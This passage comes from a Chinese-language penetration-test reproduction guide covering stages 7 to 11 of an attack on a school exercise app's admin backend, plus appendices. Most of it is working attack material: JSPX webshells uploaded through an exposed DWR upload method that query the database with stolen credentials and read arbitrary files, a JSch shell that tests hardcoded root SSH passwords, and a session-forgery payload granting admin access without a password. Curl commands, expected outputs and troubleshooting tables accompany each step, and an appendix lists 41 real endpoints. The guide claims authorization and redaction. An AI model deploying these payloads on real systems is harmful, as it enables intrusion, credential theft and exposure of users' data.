| 空内容 | 文件不存在/权限不足 | 换 `WEB-INF/classes/` 下其他文件 |
| 乱码 | 编码不是 UTF-8 | 用 `ISO-8859-1` 读取或下载原始字节 |
| 只读不到 | Web 进程权限限制 | 换可读文件，停止扩大 |

---

## 7. 阶段 7：数据库访问

### 7.1 目标

用配置文件中的凭据连接数据库，只做只读查询，确认敏感表存在。

### 7.2 只读 JDBC payload

创建 `db.jspx`。它会从 `backup.properties` 读取连接信息，只允许 `SELECT` / `SHOW`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
<jsp:scriptlet>
String q = request.getParameter("q");
if (q == null) { out.print("q required"); return; }
String qq = q.trim().toUpperCase();
if (!(qq.startsWith("SELECT") || qq.startsWith("SHOW"))) {
  out.print("read-only"); return;
}
java.util.Properties p = new java.util.Properties();
p.load(new java.io.FileInputStream(
    application.getRealPath("/WEB-INF/classes/backup.properties")));
String url = p.getProperty("database");
String user = p.getProperty("database_username");
String pass = p.getProperty("database_password");
try { Class.forName("com.mysql.cj.jdbc.Driver"); }
catch (Throwable t) { Class.forName("com.mysql.jdbc.Driver"); }
java.sql.Connection c = java.sql.DriverManager.getConnection(url, user, pass);
java.sql.Statement st = c.createStatement();
java.sql.ResultSet rs = st.executeQuery(q);
java.sql.ResultSetMetaData md = rs.getMetaData();
int n = md.getColumnCount();
while (rs.next()) {
  for (int i = 1; i <= n; i++) {
    out.print(md.getColumnLabel(i) + "=" + rs.getString(i) + " | ");
  }
  out.print("\n");
}
rs.close(); st.close(); c.close();
</jsp:scriptlet>
</jsp:root>
```

上传：

```bash
DBX="db_$(date +%s).jspx"
python3 ~/tsn-lab/dwr_upload.py "$DBX" ~/tsn-lab/payloads/db.jspx file.txt
```

### 7.3 列出表

```bash
curl -sk "$ADMIN/resources/teacherApk/$DBX?q=SHOW%20TABLES"
```

预期：返回表名列表，包含 `sys_user`、`the_server`、`app_role`、`system_operation` 等。

### 7.4 查询关键表（只读、限量）

```bash
# 管理员账号与哈希（值会回显，注意脱敏保存）
curl -sk "$ADMIN/resources/teacherApk/$DBX?q=SELECT%20id,account,user_pwd%20FROM%20sys_user%20LIMIT%205"

# 服务器清单
curl -sk "$ADMIN/resources/teacherApk/$DBX?q=SELECT%20*%20FROM%20the_server%20LIMIT%2010"

# 角色
curl -sk "$ADMIN/resources/teacherApk/$DBX?q=SELECT%20*%20FROM%20app_role%20LIMIT%2010"

# 学校-服务器映射
curl -sk "$ADMIN/resources/teacherApk/$DBX?q=SELECT%20*%20FROM%20system_operation%20LIMIT%2010"
```

预期字段：

| 表 | 关键列 | 说明 |
|---|---|---|
| `sys_user` | `id`、`account`、`user_pwd` | 后台用户；`user_pwd` 为 MD5 无盐 |
| `the_server` | `id`、`ip`、`name`、`port` | 内网服务器清单 |
| `app_role` | `id`、`role_name`、`school_id` | 教师/管理员/超管 |
| `system_operation` | `school_id`、`server_id`、`port` | 学校到服务器端口映射 |

> 实际列名可能因版本不同。先用 `SHOW COLUMNS FROM <table>` 确认。

### 7.5 验证 MD5 无盐

如果只是想验证哈希算法，不要破解真实密码。可以在靶场创建一个测试账号，设置已知密码，观察 `user_pwd` 是否等于 `MD5(password)`：

```bash
# Linux
printf '%s' '<TEST_PASSWORD>' | md5sum
# macOS
printf '%s' '<TEST_PASSWORD>' | md5 -q
```

如果与数据库中的测试账号哈希一致，说明是无盐 MD5。

排错：

| 现象 | 原因 | 处理 |
|---|---|---|
| `ClassNotFoundException` | 驱动类名不对 | 试 `com.mysql.jdbc.Driver` / `com.mysql.cj.jdbc.Driver` |
| 连接超时 | 网络隔离/防火墙 | 确认从 Web 服务器可达 `<DB_HOST>:3306` |
| `Access denied` | 凭据错误/来源限制 | 检查用户名、密码、授权主机 |
| 查询报错 | 列名/表名不同 | `SHOW COLUMNS` / `SHOW TABLES` |
| 返回空白 | 表为空/权限不足 | 换表；不要提权 |

---

## 8. 阶段 8：反编译 `LinuxStateForShell`

**目标**：从反编译代码中定位服务器管理逻辑，确认是否存在硬编码 root 凭据。

### 8.1 定位类

```bash
cd ~/tsn-lab/jadx/out/sources
rg -l 'LinuxStateForShell|runDistanceShell|restartTomcat' .
```

预期找到：

```text
com/boxin/util/LinuxStateForShell.java
```

如果只有 class 没有源码，用 `javap`：

```bash
javap -classpath ~/tsn-lab/jadx/out/sources -c -p \
  com.boxin.util.LinuxStateForShell
```

### 8.2 观察关键方法

重点看：

- `getMonitorInfo(String)`
- `restartTomcat(String, String, String)`
- `releaseCode(String, String, String, String)`
- `connect(String, String, String)`
- `main(String[])`

预期看到类似（值已隐去）：

```java
return runDistanceShell(COMMANDS, "<ROOT_ACCOUNT>", "<ROOT_PASSWORD>", scode);
```

以及：

```java
releaseCode("<INTERNAL_IP>", "<ROOT_PASSWORD>", "test", "118");
```

`connect` 中：

```java
Session session = new JSch().getSession(host, user, 22);
session.setPassword(password);
config.put("StrictHostKeyChecking", "no");
session.connect();
```

### 8.3 确认 `SysLoginCtl` 的 MD5

```bash
rg -n 'MD5|finduname|login' com/boxin/controller/sys/SysLoginCtl.java
```

预期：

```java
String md5 = MD5.encode(password);
SysUser user = sysUserService.finduname(username, md5);
```

这证明密码是 MD5 无盐比较。

### 8.4 记录证据

- 类名、方法名、行号；
- 关键常量所在的字段/指令；
- 不要复制真实密码到公开文档，只记录“该处存在硬编码 root 密码”。

排错：

| 现象 | 原因 | 处理 |
|---|---|---|
| 找不到类 | 反编译不完整/混淆 | 用 `cap_4`/`cap_8` 的 JADX 产物；搜索字符串 |
| `javap` 报类找不到 | classpath 不对 | 指向 `WEB-INF/classes` 或 JADX 输出 |
| 只有接口没有实现 | 动态代理/Spring AOP | 找实现类或 `$$EnhancerBySpringCGLIB` |

---

## 9. 阶段 9：SSH 验证

**目标**：验证硬编码 root 凭据是否真实有效，同时不修改任何密码。

### 9.1 先验端口

从被攻陷的 Web 服务器（通过 JSPX）或授权跳板机：

```bash
nc -vz "$SSH_HOST" 22
```

预期：

```text
Connection to <SSH_HOST> 22 port [tcp/ssh] succeeded!
```

### 9.2 用 SSH 客户端验证

```bash
ssh -o StrictHostKeyChecking=no \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    "$ROOT_ACCOUNT@$SSH_HOST"
```

输入 `<ROOT_PASSWORD>`。

预期：

```text
WARNING: Your password has expired.
Password change required but no TTY available.
```

解读：

- 认证通过；
- 账号被要求改密；
- 非交互式会话没有 TTY，无法改密，所以命令被拒绝。

如果看到：

```text
Permission denied (password).
```

说明密码已轮换或账号被锁，停止。

### 9.3 用 JSch 验证（更像真实利用）

保存为 `~/tsn-lab/payloads/ssh.jspx`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
<jsp:scriptlet>
String h = request.getParameter("h");
String u = request.getParameter("u");
String p = request.getParameter("p");
try {
  com.jcraft.jsch.JSch j = new com.jcraft.jsch.JSch();
  com.jcraft.jsch.Session s = j.getSession(u, h, 22);
  s.setPassword(p);
  java.util.Properties cfg = new java.util.Properties();
  cfg.put("StrictHostKeyChecking", "no");
  s.setConfig(cfg);
  s.connect(10000);
  out.print("CONNECTED " + s.getServerVersion());
  s.disconnect();
} catch (Throwable t) {
  out.print("EX=" + t);
}
</jsp:scriptlet>
</jsp:root>
```

上传并访问：

```bash
SSHX="ssh_$(date +%s).jspx"
python3 ~/tsn-lab/dwr_upload.py "$SSHX" ~/tsn-lab/payloads/ssh.jspx file.txt
curl -sk "$ADMIN/resources/teacherApk/$SSHX?h=$SSH_HOST&u=$ROOT_ACCOUNT&p=$ROOT_PASSWORD"
```

> 注意：不要把密码放在 URL 里用于真实环境；这里仅用于隔离靶场。更安全的做法是从环境变量或临时文件读取。

预期：

- `CONNECTED SSH-2.0-...`：认证通过，账号未过期；
- `EX=... password expired ...` 或响应中的 `Password change required`：**密码正确但已过期**，这是本文遇到的情况；
- `EX=com.jcraft.jsch.JSchException: Auth fail`：密码错误；
- `EX=... session is down`：连接/网络问题。

### 9.4 为什么不要继续

- 改密会影响生产；
- 非交互式改密可能触发锁定；
- 授权只允许验证，不允许变更；
- 正确做法是记录证据并通知资产所有者。

排错：

| 现象 | 原因 | 处理 |
|---|---|---|
| `NoRouteToHost` | 网络不可达/ACL | 从 Web 服务器侧再试；确认授权网段 |
| `Connection refused` | SSH 未开放/端口不同 | 换端口；确认 `the_server` 配置 |
| `Auth fail` | 密码轮换/账号锁定 | 停止，记录 |
| `password expired` | 密码过期策略 | 说明凭据正确；不要改密 |
| 连接超时 | 防火墙/跳板限制 | 用 JSch 从应用服务器发起 |

---

## 10. 阶段 10：管理后台会话伪造与管理员权限

**目标**：用 JSPX 向 session 写入伪造的 `SysUser`，拿到 `JSESSIONID`，验证 `/admin/main` 返回 200，并确认 `/admin/userAppLogFile/list` 返回 `total=6686`。

### 10.1 前置条件与关键事实

- 阶段 5 的 JSPX RCE 可用，`dwr_upload.py` 能上传文件。
- JSPX 与 `<ADMIN_BACKEND>` 属于同一个 Web 应用/会话域。
- `LoginFilter` 只检查 `session.getAttribute("user")` 是否为空；为空且路径不在白名单（`.js`、`/admin/login` 等）时跳登录。
- `SysLoginCtl` 登录成功后执行 `request.getSession().setAttribute("user", sysUser)`。
- `com.boxin.bean.sys.SysUser` 的字段是 `Integer id`、`String account`、`String name`、`String pwd`；**不是** `user_name`。

### 10.2 创建会话伪造 JSPX

保存为 `~/tsn-lab/payloads/session.jspx`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
<jsp:scriptlet>
com.boxin.bean.sys.SysUser u = new com.boxin.bean.sys.SysUser();
u.setId(Integer.valueOf(1));
u.setAccount("<ADMIN_ACCOUNT>");
u.setName("admin");
u.setPwd("x");
javax.servlet.http.HttpSession s = request.getSession(true);
s.setAttribute("user", u);
s.setMaxInactiveInterval(3600);
out.print("SID=" + s.getId());
</jsp:scriptlet>
</jsp:root>
```

要点：

- 属性名必须是 `user`；写错名字过滤器会认为未登录。
- `setId` 的参数是 `Integer`，所以用 `Integer.valueOf(1)`。
- `setPwd("x")` 是假值，过滤器不校验密码。
- `request.getSession(true)` 会创建会话；`setMaxInactiveInterval(3600)` 设为 1 小时。

### 10.3 上传并获取 JSESSIONID

```bash
SESSX="sess_$(date +%s).jspx"
python3 ~/tsn-lab/dwr_upload.py "$SESSX" ~/tsn-lab/payloads/session.jspx file.txt

RESP=$(curl -sk "$ADMIN/resources/teacherApk/$SESSX")
printf '%s\n' "$RESP"

SID=$(printf '%s' "$RESP" | grep -o 'SID=[A-Za-z0-9._-]*' | head -1 | cut -d= -f2)
echo "SID=$SID"
```

预期：

```text
{"path":"resources/teacherApk/sess_<timestamp>.jspx","returnCode":"200"}
SID=<SESSION_ID>
```

如果 `SID` 为空：

- 检查 JSPX 是否真的被解析（访问文件是否返回 500）；
- 检查类名/包名是否为 `com.boxin.bean.sys.SysUser`；
- 检查 `out.print` 是否被异常截断（看响应体）。

### 10.4 访问后台主页

```bash
curl -sk -b "JSESSIONID=$SID" \
  -D ~/tsn-lab/evidence/admin_session.headers \
  "$ADMIN/admin/main" \
  -o ~/tsn-lab/evidence/admin_session.html \
  -w "HTTP %{http_code}\n"
```

预期：

```text
HTTP 200
```

检查响应体不是登录跳转：

```bash
grep -q "window.location='/admin/login'" ~/tsn-lab/evidence/admin_session.html \
  && echo "FAIL: still login redirect" \
  || echo "OK: no login redirect"

wc -c ~/tsn-lab/evidence/admin_session.html
grep -o "<title>[^<]*</title>" ~/tsn-lab/evidence/admin_session.html | head -1
```

预期：

```text
OK: no login redirect
<非零字节数>
<title>...后台标题...</title>
```

> 注意：后台主页里可能出现 `/admin/loginout`（退出链接），不要用 `grep admin/login` 做判断，否则会误报；要匹配完整的 `window.location='/admin/login'`。

### 10.5 调用管理数据接口

```bash
curl -sk --compressed \
  -b "JSESSIONID=$SID" \
  -X POST "$ADMIN/admin/userAppLogFile/list" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Requested-With: XMLHttpRequest" \
  --data "pageSize=10&pageIndex=0" \
  -o ~/tsn-lab/evidence/admin_list.json \
  -w "HTTP %{http_code}\n"
```

预期：

```text
HTTP 200
```

提取总数（只打印 `total`，不打印记录）：

```bash
python3 - "$HOME/tsn-lab/evidence/admin_list.json" <<'PY'
import json, sys
d = json.load(open(sys.argv[1], encoding="utf-8"))
print("total =", d.get("total"))
PY
```

如果 JSON 外层还有包装，可以直接搜原始文本：

```bash
grep -o '"total"[[:space:]]*:[[:space:]]*[0-9]*' ~/tsn-lab/evidence/admin_list.json | head -1
```

预期：

```text
total = 6686
```

或：

```text
"total":6686
```

> 隐私要求：只记录总数 `6686`。不要保存、打印、截图或传播 `rows`/`data` 中的任何用户记录、账号、文件名、token。

### 10.6 判定与影响

| 检查 | 预期 | 含义 |
|---|---|---|
| `GET /admin/main` | 200，无登录跳转 | `LoginFilter` 已认可伪造会话 |
| `POST /admin/userAppLogFile/list` | 200 JSON，`total=6686` | 管理数据接口可用，不只是页面可访问 |
| 管理员明文密码 | 不需要 | 密码校验被会话伪造绕过 |

结论：**无需管理员明文密码即可获得管理后台管理员权限**，该步骤完成“管理后台管理员权限”目标。

### 10.7 失败排错

| 现象 | 可能原因 | 处理 |
|---|---|---|
| `/admin/main` 仍 302/跳登录 | Cookie 名不是 `JSESSIONID`；会话未建立/已过期 | 重新执行 JSPX；确认 `SID`；同一主机/端口 |
| 200 但仍是登录页 | `setAttribute("user", u)` 没生效 | 检查属性名是否为 `user`；检查 `SysUser` 实例化 |
| 500 | 类名/字段不匹配 | 确认 `com.boxin.bean.sys.SysUser` 与 `setId/setAccount/setName/setPwd` |
| `list` 404/405 | 路径或方法不对 | 使用 `POST /admin/userAppLogFile/list` |
| `list` 406 | Content-Type/Accept 不匹配 | 表单编码 + `X-Requested-With: XMLHttpRequest` |
| `total=0` | 数据为空/权限仍不足 | 记录实际值；不要枚举用户记录 |
| 会话很快失效 | 容器重启/会话超时 | 重新执行 JSPX；立即验证 |

### 10.8 清理与小结

可选：访问退出接口使会话失效：

```bash
curl -sk -b "JSESSIONID=$SID" "$ADMIN/admin/loginout" -o /dev/null -w "HTTP %{http_code}\n"
```

删除 `sess_*.jspx`（清理 payload 已包含 `sess_` 前缀，见下一节）。关键细节：

- 属性名是 `user`；
- 字段是 `id/account/name/pwd`；
- 过滤器只检查存在性，不校验身份来源；
- 修复必须重建会话信任模型，而不是只改过滤器字符串。

---

## 11. 清理与收尾

### 11.1 删除上传的验证文件

如果仍有 JSPX 访问权限，保存为 `~/tsn-lab/payloads/clean.jspx` 并上传：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
<jsp:scriptlet>
java.io.File dir = new java.io.File(application.getRealPath("/resources/teacherApk/"));
java.io.File[] fs = dir.listFiles();
if (fs != null) {
  for (java.io.File f : fs) {
    String n = f.getName();
    if (n.startsWith("tsn_") || n.startsWith("probe_") || n.startsWith("read_")
        || n.startsWith("db_") || n.startsWith("ssh_") || n.startsWith("sess_") || n.startsWith("clean_")) {
      out.print("DEL " + n + "=" + f.delete() + "\n");
    }
  }
}
out.print("REMAIN:\n");
java.io.File[] rs = dir.listFiles();
if (rs != null) for (java.io.File f : rs) out.print(" " + f.getName());
</jsp:scriptlet>
</jsp:root>
```

上传为 `clean_<random>.jspx`，访问执行，然后确认（`$NAME` 换成你实际上传过的探针文件名）：

```bash
CLEAN="clean_$(date +%s).jspx"
python3 ~/tsn-lab/dwr_upload.py "$CLEAN" ~/tsn-lab/payloads/clean.jspx file.txt
curl -sk "$ADMIN/resources/teacherApk/$CLEAN"
curl -sk -o /dev/null -w "%{http_code}\n" "$ADMIN/resources/teacherApk/$NAME"
curl -sk -o /dev/null -w "%{http_code}\n" "$ADMIN/resources/teacherApk/$SESSX"
```

预期：清理页打印 `DEL ...=true`，`$NAME` 与 `$SESSX` 均返回 404。

### 11.2 本地清理

```bash
# 删除本地保存的敏感响应（按授权方要求保留证据的除外）
rm -f ~/tsn-lab/evidence/backup.properties
rm -f ~/tsn-lab/evidence/*.cookies
rm -f ~/tsn-lab/evidence/admin_session.html
rm -f ~/tsn-lab/evidence/admin_list.json

# 清理临时 payload
rm -f ~/tsn-lab/payloads/*.jspx
```

### 11.3 证据归档

需要保留的证据：

- 请求/响应原始报文（含时间、Host、状态码）；
- 关键页面的截图或 HTML；
- 数据库查询结果（脱敏后）；
- SSH 认证结果；
- 时间线。

归档时加密，访问受限，测试结束后按授权方要求销毁。

---

## 12. 统一排错表

| 阶段 | 现象 | 最可能原因 | 处理 |
|---|---|---|---|
| 1 | `jadx` 类不全 | 加固/多 DEX | 用脱壳产物；指定 DEX |
| 1 | `dz` 返回 null | Context/证书 | 补桩；匹配证书 |
| 2 | 验证码为空 | 参数在 body | 放 query string |
| 2 | 验证码错误 | 大小写/过期 | 统一小写；同 Cookie 重取 |
| 2 | 登录 500 | 用户不存在/后端异常 | 停止，不重试 |
| 3 | `.js` 仍跳登录 | 已修复 | 记录，停止 |
| 3 | `.js` 返回 406 | JSON 控制器 | 换页面，不对 JSON 用后缀 |
| 4 | `instanceId` 错误 | 缺字段 | 补 `instanceId=0` |
| 4 | DWR 500 | 参数类型 | 检查 `c0-paramN` |
| 4 | 上传连接重置 | WAF | `file.txt` + 无害内容 |
| 5 | JSPX 404 | 未写入/名字错 | 看 DWR `path` |
| 5 | JSPX 500 | 语法错 | 检查 XML |
| 5 | 返回源码 | 未解析 | 换 `.jsp` 或确认配置 |
| 6 | 配置 404 | 路径错 | 用 `ROOT` 绝对路径 |
| 7 | DB 连接失败 | 网络/凭据 | 从 Web 服务器侧测；核对配置 |
| 8 | 找不到类 | 反编译不全 | 搜索字符串/换 DEX |
| 9 | SSH 拒绝 | 密码轮换 | 停止 |
| 9 | SSH 超时 | ACL | 用 JSch 从应用服务器发起 |
| 10 | `/admin/main` 仍跳登录 | Cookie/SID 错或会话未建立 | 重跑 JSPX；核对 `JSESSIONID`；同主机 |
| 10 | `list` 404/406 | 方法/Content-Type 错 | `POST` + 表单 + `X-Requested-With` |
| 10 | `total` 不是 6686 | 数据不同/权限不足 | 记录实际值；不要列记录 |

---

## 附录 A：41 条真实端点清单

> 说明：以下为解密后的路径。`<TARGET_DOMAIN>`、`<ADMIN_BACKEND>`、`<STATIC_DOMAIN>`、`<H5_DOMAIN>` 为占位符；`<ROUTE_CODE>` 为业务路径中的固定路由/租户码。完整密文与解密结果见授权方内部材料。

### A.1 基础域名 / 协议页（3）

| # | 路径 | 用途 |
|---:|---|---|
| 1 | `<TARGET_DOMAIN>/` | 默认业务根 |
| 2 | `<STATIC_DOMAIN>/static/user_agreement_info.html` | 用户协议（信息版） |
| 3 | `<STATIC_DOMAIN>/static/user_agreement.html` | 用户协议 |

### A.2 认证服务（2）

| # | 路径 | 用途 |
|---:|---|---|
| 4 | `auth/oauth/token` | OAuth2 登录 |
| 5 | `auth/token/logout` | 登出 |

### A.3 upms 用户权限服务（14）

| # | 路径 | 用途 |
|---:|---|---|
| 6 | `upms/basUser/isDefalutPass` | 是否默认密码 |
| 7 | `upms/basUser/getLoginUserInfo` | 当前用户信息 |
| 8 | `upms/basUser/getLoginUserInfoThird` | 三方登录用户信息 |
| 9 | `upms/basUserImage/addUserFace` | 人脸数据上传 |
| 10 | `upms/sysSchool/getSchoolDetail` | 学校详情 |
| 11 | `upms/sysSchool/getAppid` | 学校 appId |
| 12 | `upms/app/listMenu` | 菜单权限 |
| 13 | `upms/app/getH5Url` | H5 入口 |
| 14 | `upms/messageNotice/getLatestUnreadNotice` | 最新未读通知 |
| 15 | `upms/messageNotice/getMessageNoticeVoById` | 通知详情 |
| 16 | `upms/messageArticle/listByType` | 文章列表 |
| 17 | `upms/messageArticleClickRecord/appClickArticle` | 点击记录 |
| 18 | `upms/app/getWeather` | 天气 |
| 19 | `upms/app/saveWeather` | 天气上报 |

### A.4 exercise 运动服务（16）

| # | 路径 | 用途 |
|---:|---|---|
| 20 | `exercise/exerciseSetting/<ROUTE_CODE>/getSetting` | 跑步配置 |
| 21 | `exercise/exerciseSetting/<ROUTE_CODE>/getExerciseStartTime` | 服务端起始时间 |
| 22 | `exercise/exerciseSetting/checkTimeOut` | 超时校验 |
| 23 | `exercise/exerciseSetting/getExerciseQuestion` | 校验题 |
| 24 | `exercise/exerciseSetting/sendFace2DeviceResult` | 人脸结果回传 |
| 25 | `exercise/exerciseRecord/<ROUTE_CODE>/addExerciseRecord` | 运动记录上报 |
| 26 | `exercise/exerciseRecord/<ROUTE_CODE>/listExerciseRecord` | 记录列表 |
| 27 | `exercise/exerciseRecord/<ROUTE_CODE>/getExerciseRecord` | 记录详情 |
| 28 | `exercise/exerciseRecord/statisticsExerciseRecord` | 统计 |
| 29 | `exercise/exerciseRecord/sumExerciseRecord` | 总里程 |
| 30 | `exercise/exerciseRecord/checkExerciseRecord` | 记录校验 |
| 31 | `exercise/exerciseRunningFace/faceVer` | 人脸校验 |
| 32 | `exercise/exerciseRunningFace/<ROUTE_CODE>/face` | 分阶段人脸 |
| 33 | `exercise/exerciseExplanation/getExerciseExplanationV2` | 锻炼说明 |
| 34 | `exercise/exerciseFeedback/getFeedbackBalance` | 申诉余额 |
| 35 | `exercise/exerciseFeedback/addExerciseFeedback` | 申诉提交 |

### A.5 旧后台 `<ADMIN_BACKEND>`（4）

| # | 路径 | 用途 |
|---:|---|---|
| 36 | `/admin/studentAppUpdate/stuAppVersion2` | 版本下发 |
| 37 | `/admin/userAppLogFile/addLogData` | bugReport 日志上传 |
| 38 | `/app/sch/listSchoolDatas` | 学校列表 |
| 39 | `/app/sch/getSchoolById` | 学校详情 |

### A.6 外部服务（2）

| # | 路径 | 用途 |
|---:|---|---|
| 40 | `http://<H5_DOMAIN>/circle/circleRecord/appGetCircleH5Url` | 圈子 H5 |
| 41 | `<VERSION_CHECK_URL>` | 版本检查（第三方） |

> 另有静态注解中的极光推送别名删除：`DELETE https://device.jpush.cn/v3/aliases/{alias}`，不计入 41 条业务端点。

---

## 附录 B：`dwrUploadService` 暴露方法

| 方法 | 参数 | 说明 |
|---|---|---|
| `uploadFile` | `(String, InputStream, String)` | 通用上传 |
| `uploadApkFile` | `(String, InputStream, String)` | APK 上传 |
| `uploadApkToDesDir` | `(String, InputStream)` | 写入指定目录，**本次利用点** |
| `uploadMaterialSource` | `(String, InputStream)` | 素材上传 |
| `uploadLocalFile` | `()` | 本地上传 |
| `uploadBase64PicQiniu` | `(...)` | 七牛图片 |
| `uploadMitiPicQiniu` | `(...)` | 七牛图片 |
| `uploadStudentQinniuFile` | `(...)` | 学生文件 |
| `uploadTeacherQinniuFile` | `(...)` | 教师文件 |
| `uploadVideoQiniu` | `(...)` | 视频 |
| `uploadAdverQinniuFile` | `(...)` | 广告文件 |
| Spring AOP 方法 | `setTargetSource` 等 | 代理方法，通常不应暴露 |

> 生产环境应禁用 DWR，或至少移除 `dwr/test`、限制方法白名单和来源 IP。

---

## 附录 C：payload 模板

### C.1 EL 探针

```xml
<?xml version="1.0" encoding="UTF-8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
  <jsp:text>${31337*3}</jsp:text>
</jsp:root>
```

预期 `94011`。

### C.2 文件读取

```xml
<?xml version="1.0" encoding="UTF-8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
<jsp:scriptlet>
String f = request.getParameter("f");
if (f != null) {
  java.io.File file = new java.io.File(f);
  if (!file.isAbsolute()) file = new java.io.File(application.getRealPath("/"), f);
  out.print("=== " + file.getAbsolutePath() + " ===\n");
  java.io.FileInputStream in = new java.io.FileInputStream(file);
  byte[] buf = new byte[8192]; int n;
  while ((n = in.read(buf)) > 0) out.print(new String(buf, 0, n, "UTF-8"));
  in.close();
}
</jsp:scriptlet>
</jsp:root>
```

### C.3 只读 JDBC

见第 7.2 节。核心是从 `backup.properties` 读取连接信息，只允许 `SELECT` / `SHOW`。

### C.4 JSch

见第 9.3 节。核心是 `JSch.getSession(user, host, 22)` + `setPassword` + `StrictHostKeyChecking=no`。

### C.5 会话伪造

见第 10.2 节。核心是 `session.setAttribute("user", sysUser)`；`SysUser` 字段为 `id/account/name/pwd`，属性名必须是 `user`。

> 这些模板只用于授权靶场。不要在生产环境上传、执行或保留。

---

## 附录 D：证据记录清单

每个阶段至少记录：

- [ ] 时间（UTC）、操作人、目标地址；
- [ ] 请求方法、URL、关键 Header、Body（脱敏）；
- [ ] 响应状态码、Content-Type、长度、关键片段；
- [ ] 截图/HTML/文件哈希；
- [ ] 结论与证据等级（实锤/强推断/未确认）；
- [ ] 会话伪造：JSPX 返回的 `SID`（文档中记为 `<SESSION_ID>`）、`/admin/main` 200、`/admin/userAppLogFile/list` 的 `total=6686`；不要保存用户记录；
- [ ] 是否触发 WAF/告警；
- [ ] 清理是否完成。

---

> **文档结束**。再次强调：本文仅用于已获书面授权的靶场复现。真实域名、IP、账号、密码、哈希、令牌、密钥均已隐去。
